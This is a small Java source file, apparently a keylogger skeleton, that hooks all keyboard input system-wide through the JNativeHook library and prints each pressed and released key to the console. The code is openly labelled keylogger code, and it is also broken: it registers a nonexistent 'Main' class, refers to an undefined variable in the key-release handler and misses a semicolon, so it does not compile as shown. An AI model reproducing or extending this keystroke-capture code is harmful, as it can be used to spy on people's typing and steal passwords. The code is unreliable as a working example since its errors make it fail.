package keylogger;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Properties;
import java.util.logging.FileHandler;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

public static void main(String[] args){

		try{
		GlobalScreen.registerNativeHook();
		}catch(NativeHookException e){
		e.printStackTrace();
		}

		GlobalScreen.getInstance().addNativeKeyListener(new Main());
		}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Key pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
	System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()))
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
	}

}